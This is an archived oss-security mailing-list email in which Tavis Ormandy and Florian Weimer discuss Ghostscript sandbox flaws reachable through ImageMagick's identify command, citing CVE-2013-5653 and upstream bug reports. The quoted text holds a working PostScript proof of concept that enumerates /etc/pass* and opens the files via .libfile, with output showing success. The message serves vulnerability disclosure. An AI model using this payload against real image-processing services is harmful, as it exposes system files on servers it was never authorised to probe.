X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1996" "Thursday" "29" "September" "2016" "05:02:19" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>" "70" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Date:" nil nil "9" "2016092912:02:19" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 29   70/1996  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<877f9vcjd9.fsf@mid.deneb.enyo.de>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "<877f9vcjd9.fsf@mid.deneb.enyo.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 11466 invoked by uid 550); 29 Sep 2016 12:59:47 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19885 invoked from network); 29 Sep 2016 12:02:52 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=m1doUwPYc1aYggswBKFFOFMNsrnXV/MMpFitX2z0yv4=;
        b=RegkGvDGITSgkfII2WWWOoyQ8VGF/HgmrhwdB0PykGw+d1/uHH+bQfkaVMkanzJOz6
         +lUmO+JNe2nX+v1CjiQVHDnQO6WvFeDIhCSmBVKgBKTwbFQGV66ihxjsiWek1eYvA+zc
         yY9+MeY4zEvFjJn/59BbZB4giLH1eJ8T7YJQUjXxFi3pxazvoW5ypRf2IY63leSCIgDi
         ZNqH15FTTF6LKpAQ+y2DY6oJoQcwLoOqIbvpR7JpZ3EPTDc8jm5bqHoSffVtrIqUCBq1
         5nOidAjBaXDa/sVw20075dqT0hK79vk3TpJtX3trjoDAPbcn4MypwI0IebOJ/c4S6HEF
         T1ig==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=m1doUwPYc1aYggswBKFFOFMNsrnXV/MMpFitX2z0yv4=;
        b=BZWDpq3tMAy9lVFeXKlrMbZQHopfP591/6UIjY6Wqocfi038J6qSMTVnlnHy2C77Zj
         GvaUCN0EWmiAe14d4MPjFe/zLoawWqvuCCG0yYvw6TYlSTLNlbodS6a4VPKipvyfCMdF
         Z0goEXZjemtbcSR9xFME3p3lWxL4a6Ygy2icfYkzWmrRbo0Cl+jvDly/oIr5y2aNPwqM
         kJlcRiWg1cEc07SyCJVJtj2N9upBuEvuMdE+BF54a0hkbicYkGrC9dd3dTvLnhdiL9iQ
         tqmoYCKLDPA9Z9zeV6zcotokHeDrh54nBL+Uc46U1J071Gd+I6s2IILEclciepJmGtuj
         buvw==
X-Gm-Message-State: AA6/9RkT5J945Ap4Bose6oHPUnWKb0sCXzxogz6Ptu+IkMFAUojctUEdQSP0rRYcRgOZ26wciASiiwrIYz7b0mex
X-Received: by 10.31.234.195 with SMTP id i186mr554058vkh.127.1475150559899;
 Thu, 29 Sep 2016 05:02:39 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <877f9vcjd9.fsf@mid.deneb.enyo.de>
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
 <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
 <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
 <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com> <877f9vcjd9.fsf@mid.deneb.enyo.de>
Message-ID: <CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Date: Thu, 29 Sep 2016 05:02:19 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: oss-security@lists.openwall.com

On Wed, Sep 28, 2016 at 11:25 PM, Florian Weimer <fw@deneb.enyo.de> wrote:
>
> * Tavis Ormandy:
>
> > Here is the code I'm testing with (Note: I really don't know much
> > postscript - and I hate it).
> >
> > $ cat test.ps
> > /dumpname {
> >     dup             % copy filename
> >     dup             % copy filename
> >     print           % print filename
> >     (\n) print      % print newline
> >     status          % stat filename
> >     {
> >         (stat succeeded\n) print
> >         ( ctime:) print
> >         64 string cvs print
> >         ( atime:) print
> >         64 string cvs print
> >         ( size:) print
> >         64 string cvs print
> >         ( blocks:) print
> >         64 string cvs print
> >         (\n) print
> >         (\n) print
> >     }{
> >         (unable to stat\n\n) print
> >     } ifelse
> >     .libfile        % open as library
> >     {
> >         (.libfile returned file\n\n) print
> >         64 string readstring
> >         pop         % discard result (should proably test)
> >         print
> >         (\n) print
> >     }{
> >         (.libfile returned string\n) print
> >         print
> >         (\n) print
> >     } ifelse
> > } def
> >
> > (/etc/pass*) /dumpname load 256 string filenameforall
>
> filenameforall was fixed as part of this:
>
>   http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
>   http://bugs.ghostscript.com/show_bug.cgi?id=694724
>
> This also covers getenv and has already been assigned CVE-2013-5653.

Thanks Florian, that explains it, although the distros do not appear
to have picked that patch up.

>
> > $ identify test.ps
> > /etc/passwd
> > stat succeeded
> >  ctime:1474998792 atime:1474998792 size:2662 blocks:8
> >
> > .libfile returned file
>
> .libfile is not yet fixed upstream.  I reported this upstream:
>
>   http://bugs.ghostscript.com/show_bug.cgi?id=697169

Thanks - seems like bad news for any automated image/document processing.

Tavis.
